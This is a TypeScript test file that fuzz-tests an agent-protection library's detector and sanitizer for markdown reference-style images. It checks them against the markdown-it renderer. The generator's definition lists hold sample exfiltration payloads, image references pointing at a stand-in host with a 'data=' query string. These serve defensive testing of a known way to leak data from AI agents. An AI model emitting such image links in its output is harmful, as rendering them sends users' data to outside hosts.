import { createRequire } from 'node:module';
import { describe, expect, it } from 'vitest';
import { AgentArmor } from '../agent-armor';
import { MarkdownReferenceExfiltrationDetector } from '../detectors/behavioural-control/markdown-reference-exfiltration';

/**
 * A real renderer as the oracle (#225). The scan reads brackets, code spans and
 * blocks the way a markdown parser does, so the honest check is against one:
 * generate documents from block and inline constructs, render them with
 * markdown-it (HTML off and on), and require that every document in which a
 * reference-style image with an exfiltration URL is drawn is flagged.
 */
const require = createRequire(import.meta.url);
const MarkdownIt = require('markdown-it');
const renderers = [new MarkdownIt({ html: false }), new MarkdownIt({ html: true })];
const detector = new MarkdownReferenceExfiltrationDetector();

function rng(seed: number): () => number {
  let s = seed >>> 0;
  return () => {
    s = (s + 0x6d2b79f5) >>> 0;
    let t = s;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}
const pick = <T,>(rand: () => number, items: T[]): T => items[Math.floor(rand() * items.length)];

const STARTS = [
  '', '', '', '- ', '* ', '+ ', '1. ', '2. ', '10) ', '> ', '>> ', '    ', '\t', '  ', '   ', '- > ', '> - ', '> > ', '# ', '## ',
  '```', '~~~', '````', '- ```', '> ```', '1. ```', '***', '---', '___', '- - -', '===', '-', '+', '|', '| ', '<div>', '<div ',
  '<!--', '-->', '<script>', '</script>', '<pre>', '<?', '?>', '<span title="', '[a]: x ', '[a]: <x> "', '- - ', '      ',
];
const ATOMS = [
  '`', '``', '```', '[', ']', '![', '\\', '\\`', '<', '>', '|', '"', "'", '(', ')', 'a', 'b', ' ', 'x`y', '<http://h/[>', '<a@b.c>',
  '[x](a`b)', '[x](<a`b> "t")', '[x]( a`b "`" )', '<span title="`">', '</b>', '[x](a "`")', '|---|---|', '|:-|-:|', '| a | b |', ' | ',
  '<!-- ` -->', '<!--', '-->', '<?php ` ?>', '&#96;', '\n', '\n\n', '    ', '[r2]', '![r2]',
];
const IMAGES = [
  '![a][r]', '![r][]', '![r]', '![a `]` b][r]', '[ ![a `]` b][r]', '![a [b] c][r]', 'x ![a `]` b][r]', '![a `]` b][r] `', '`x ![a `]` b][r]',
  '[ ![a <b@c.d> ]` b][r]', '![a [x](u`v) b][r]', '[x]( ![a `]` b][r]', '![a `]` b ][ r ]', '![a `]` b][R]',
];
const DEFINITIONS = [
  '[r]: https://e.x/p.png?data=Q', '[r]: https://e.x/p.png?data=Q "`"', '[r]: https://e.x/p.png?data=Q (`)', '[r]:\n  https://e.x/p.png?data=Q',
  '[r]: https://e.x/p.png?data=Q\n  "t`"', '> [r]: https://e.x/p.png?data=Q', '- [r]: https://e.x/p.png?data=Q', '   [r]: https://e.x/p.png?data=Q',
  '    [r]: https://e.x/p.png?data=Q', '[r]: <https://e.x/p.png?data=Q>', '[R]: https://e.x/p.png?data=Q',
];

function generate(rand: () => number): string {
  const lines: string[] = [];
  for (let n = 1 + Math.floor(rand() * 6); n > 0; n--) {
    let line = pick(rand, STARTS);
    for (let k = Math.floor(rand() * 3); k > 0; k--) line += pick(rand, ATOMS);
    lines.push(line);
  }
  lines.splice(Math.floor(rand() * (lines.length + 1)), 0, pick(rand, STARTS) + pick(rand, IMAGES));
  if (rand() < 0.4) lines.push('');
  lines.splice(rand() < 0.7 ? lines.length : 0, 0, pick(rand, DEFINITIONS));
  return lines.join(rand() < 0.1 ? '\r\n' : '\n') + '\n';
}

function drawsExfilImage(doc: string, md: { parse(src: string, env: object): Array<{ type: string; attrGet(name: string): string | null; children?: unknown[] | null }> }): boolean {
  const walk = (tokens: Array<{ type: string; attrGet(name: string): string | null; children?: unknown[] | null }>): boolean =>
    tokens.some((t) => (t.type === 'image' && /[?&]data=Q/.test(t.attrGet('src') ?? '')) || (Array.isArray(t.children) && walk(t.children as typeof tokens)));
  return walk(md.parse(doc, {}));
}

describe('sanitized text against a real renderer (#226)', () => {
  const armor = AgentArmor.regexOnly();
  const marker = '[BLOCKED: exfiltration instruction removed by AgentArmor]';
  it('a marker-labelled definition cannot turn the sanitized text back into an image', () => {
    const doc = `!![a][r]\n\n[r]: https://e.x/p.png?data=Q\n${marker}: https://e.x/p.png?data=Q\n`;
    expect(renderers.some((md) => drawsExfilImage(doc, md))).toBe(true);
    const out = armor.scanSync(doc).sanitized;
    expect(renderers.some((md) => drawsExfilImage(out, md))).toBe(false);
  });
  for (const seed of [1, 2]) {
    it(`sanitized output draws no exfil image in generated documents (seed ${seed})`, () => {
      const rand = rng(seed);
      const left: string[] = [];
      for (let n = 0; n < Number(process.env.ORACLE_CASES ?? 6000) / 2; n++) {
        const doc = generate(rand);
        if (!renderers.some((md) => drawsExfilImage(doc, md))) continue;
        const out = armor.scanSync(doc).sanitized;
        if (renderers.some((md) => drawsExfilImage(out, md))) left.push(doc);
      }
      expect(left.slice(0, 3).map((doc) => JSON.stringify(doc))).toEqual([]);
    }, 120_000);
  }
});

describe('against a real renderer (#225)', () => {
  const cases = Number(process.env.ORACLE_CASES ?? 6000);
  for (const seed of [1, 2, 3]) {
    it(`flags every reference image markdown-it draws with an exfiltration URL (seed ${seed})`, () => {
      const rand = rng(seed);
      let rendered = 0;
      const missed: string[] = [];
      for (let n = 0; n < cases; n++) {
        const doc = generate(rand);
        if (!renderers.some((md) => drawsExfilImage(doc, md))) continue;
        rendered++;
        if (detector.findPatterns(doc).length === 0) missed.push(doc);
      }
      // A generator that draws nothing proves nothing.
      expect(rendered / cases).toBeGreaterThan(0.25);
      expect(missed.slice(0, 3).map((doc) => JSON.stringify(doc))).toEqual([]);
    }, 120_000);
  }
});
